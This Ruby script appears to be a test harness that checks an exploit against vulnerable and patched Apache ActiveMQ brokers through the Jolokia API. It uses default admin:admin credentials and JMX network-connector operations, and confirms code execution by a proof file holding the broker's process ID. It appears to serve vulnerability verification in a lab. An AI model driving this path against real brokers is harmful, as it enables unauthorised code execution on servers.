# frozen_string_literal: true

require 'base64'
require_relative '../activemq_openwire/native_probe'

# Reuse vendor decoding/JMS capture helpers; the parent OpenWire attack is never
# invoked by this independently owned Jolokia gate.
class NativeActiveMqJolokiaProbe < NativeActiveMqProbe
  PROFILES = {
    'affected' => { version: '5.19.3', base: '', broker: 'module-target-affected' },
    'prefix' => { version: '5.19.3', base: '/module-target', broker: 'module-target-prefix' },
    'fixed' => { version: '5.19.4', base: '', broker: 'module-target-fixed' }
  }.freeze

  def run
    PROFILES.each do |service, profile|
      java = command(service, 'java', '-version')
      identity = control(service, 'info')
      raise 'Native product/version mismatch' unless field(identity, 'OPENWIRE_NAME') == 'ActiveMQ' && field(identity, 'OPENWIRE_VERSION') == profile.fetch(:version)

      broker = attribute(service, 'BrokerName')
      version = attribute(service, 'BrokerVersion')
      raise 'Native API identity mismatch' unless broker.fetch('value') == profile.fetch(:broker) && version.fetch('value') == profile.fetch(:version)

      agent = document(api(service))
      raise 'Native Jolokia agent unavailable' unless agent.fetch('status') == 200 && agent.dig('value', 'agent')

      missing_origin = document(api(service, origin: false))
      raise 'Native Origin policy mismatch' unless missing_origin.fetch('status') == 403
      raise 'Native auth refusal mismatch' unless api(service, credentials: 'admin:module-target-invalid').fetch(:code) == 401
      raise 'Native missing-path policy mismatch' unless api(service, path: '/api/module-target-missing').fetch(:code) == 404

      user = attribute(service, 'BrokerVersion', credentials: 'user:user')
      raise 'Native fixture-user policy mismatch' unless user.fetch('value') == profile.fetch(:version)

      pid = broker_pid(command(service, 'ps', '-ww', '-eo', 'pid,user,comm,args'))
      original = directory(service)
      raise 'Unexpected native connector state' unless connectors(service).empty?

      attempts = 2.times.map { |index| proof(service, index, pid, original) }
      tcp = tcp_bridge(service, service == 'fixed' ? 'affected' : 'fixed')
      raise 'Native state not restored after TCP bridge' unless directory(service) == original && connectors(service).empty?

      @records[:profiles][service] = {
        java: java, identity: identity, broker: broker, version: version, agent: agent,
        missing_origin: missing_origin, user: user, broker_pid: pid, attempts: attempts, tcp: tcp
      }
    end
    unrelated
    @records
  ensure
    File.write(File.join(@runtime.fetch('artifacts'), 'native-jolokia-partial.json'), JSON.pretty_generate(@records))
  end

  private

  def proof(service, index, pid, original)
    profile = PROFILES.fetch(service)
    jolokia_jms(service)
    path = "/tmp/module-target-native-jolokia-#{index}"
    command(service, 'test', '!', '-e', path)
    credentials = index.zero? ? 'admin:admin' : 'user:user'
    output = command(service, 'java', '-Xmx128m', '-cp', CLASSPATH, 'NativeJmxProof', path,
                     "http://127.0.0.1:8161#{profile.fetch(:base)}", profile.fetch(:broker), credentials)
    response = JSON.parse(Base64.strict_decode64(field(output, 'JMX_RESPONSE_BASE64')))
    present = field(output, 'PROOF_PRESENT') == 'true'
    raise 'Native execution policy mismatch' unless present == (service != 'fixed')

    if present
      raise 'Native XML callback absent' unless field(output, 'XML_REQUEST_COUNT').to_i.positive?
      raise 'Native JMX creation mismatch' unless response.fetch('status') == 200 && response.fetch('value') == 'NC'
      raise 'Proof owner mismatch' unless command(service, 'stat', '-c', '%U', path).strip == 'activemq'
      raise 'Proof parent is not the broker JVM' unless command(service, 'cat', path).to_i == pid
      raise 'Native connector missing' unless connectors(service).one?

      remove_connector(service)
      command(service, 'rm', path)
    else
      raise 'Patched broker fetched proof XML' unless field(output, 'XML_REQUEST_COUNT') == '0'
      raise 'Patched nested-vm refusal mismatch' unless response.fetch('status') == 400 && response.fetch('error').include?('VM scheme is not allowed')

      command(service, 'test', '!', '-e', path)
    end
    raise 'Native connector state not restored' unless connectors(service).empty?

    jolokia_jms(service)
    raise 'Native temporary directory not restored' unless directory(service) == original

    { credentials: credentials, output: output, response: response }
  end

  def api(service, body = nil, credentials: 'admin:admin', origin: true, path: '/api/jolokia/')
    args = [
      'curl', '--silent', '--show-error', '--globoff', '--max-time', '5', '--user', credentials,
      '--write-out', "\nMODULE_TARGET_HTTP_CODE=%{http_code}" # rubocop:disable Style/FormatStringToken
    ]
    args += ['--header', 'Content-Type: application/json', '--data', JSON.generate(body)] if body
    args += ['--header', 'Origin: http://127.0.0.1:8161'] if origin
    args << "http://127.0.0.1:8161#{PROFILES.fetch(service).fetch(:base)}#{path}"
    text, marker, status = command(service, *args).rpartition("\nMODULE_TARGET_HTTP_CODE=")
    raise 'Native HTTP accounting marker absent' if marker.empty?

    result = { code: Integer(status), body: text }
    (@records[:http] ||= []) << { service: service, request: body, credentials: credentials, origin: origin, path: path, response: result }
    result
  end

  def document(response)
    raise "Native HTTP failure: #{response.inspect}" unless response.fetch(:code) == 200

    JSON.parse(response.fetch(:body))
  end

  def mbean(service)
    "org.apache.activemq:type=Broker,brokerName=#{PROFILES.fetch(service).fetch(:broker)}"
  end

  def attribute(service, name, **)
    value = document(api(service, { type: 'read', mbean: mbean(service), attribute: name }, **))
    raise 'Native attribute read failed' unless value.fetch('status') == 200

    value
  end

  def search(service, query)
    result = document(api(service, { type: 'search', mbean: query }))
    raise 'Native JMX search failed' unless result.fetch('status') == 200

    result.fetch('value')
  end

  def connectors(service)
    search(service, "#{mbean(service)},connector=networkConnectors,*")
  end

  def execute(service, operation, arguments)
    document(api(service, { type: 'exec', mbean: mbean(service), operation: operation, arguments: arguments }))
  end

  def remove_connector(service)
    result = execute(service, 'removeNetworkConnector(java.lang.String)', ['NC'])
    raise 'Native connector removal failed' unless result.fetch('status') == 200 && result.fetch('value') == true
  end

  def tcp_bridge(service, peer)
    result = execute(service, 'addNetworkConnector(java.lang.String)', ["static:(tcp://#{peer}:61616)"])
    raise 'Legitimate native TCP connector refused' unless result.fetch('status') == 200 && result.fetch('value') == 'NC'

    deadline = Process.clock_gettime(Process::CLOCK_MONOTONIC) + 4
    bridges = search(service, "#{mbean(service)},connector=networkConnectors,networkConnectorName=NC,networkBridge=*")
    while bridges.empty? && Process.clock_gettime(Process::CLOCK_MONOTONIC) < deadline
      sleep(0.1)
      bridges = search(service, "#{mbean(service)},connector=networkConnectors,networkConnectorName=NC,networkBridge=*")
    end
    raise 'Genuine TCP bridge did not connect' if bridges.empty?

    remove_connector(service)
    { response: result, actual_bridges: bridges }
  end

  def jolokia_jms(service)
    output = control(service, 'jms')
    raise 'Native JMS policy mismatch' unless field(output, 'JMS_ROUNDTRIP') == 'matched' && field(output, 'JMS_DESTINATION_REMOVED') == 'true' && field(output, 'JMS_BROKER') == PROFILES.fetch(service).fetch(:broker)
  end

  def unrelated
    version = command('unrelated', 'httpd', '-v')
    raise 'Unrelated vendor version mismatch' unless version.include?('Apache/2.4.62')

    response = command('affected', 'curl', '--silent', '--show-error', '--output', '/dev/null', '--write-out', '%{http_code}', 'http://unrelated/api/jolokia/') # rubocop:disable Style/FormatStringToken
    raise 'Unrelated endpoint mismatch' unless response == '404'

    @records[:profiles]['unrelated'] = { version: version, jolokia_code: response }
  end
end

puts JSON.pretty_generate(NativeActiveMqJolokiaProbe.new.run) if $PROGRAM_NAME == __FILE__
